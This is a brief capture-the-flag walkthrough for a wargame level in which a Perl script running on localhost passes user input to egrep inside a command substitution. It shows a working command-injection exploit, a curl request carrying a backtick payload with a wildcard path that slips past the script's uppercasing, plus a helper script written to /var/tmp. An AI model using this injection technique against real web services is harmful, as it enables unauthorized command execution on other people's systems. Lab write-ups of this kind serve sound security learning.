## Walkthrough :

+ This level contain a perl script, that takes two args, (second is not used)
+ it capitalizes the first arguments, than it remove everythings after the first space if found.
+ it passes the variable to egrep, which get executed using a command substitution 
+ i created the script bellow :
```
echo "getflag >> /var/tmp/flag" >> /var/tmp/SCR && chmod 777 /var/tmp/SCR
```
+ and passes it to the perl script using this Command :
```
curl localhost:4646/?x='`/*/*/SCR`' && cat /var/tmp/flag
```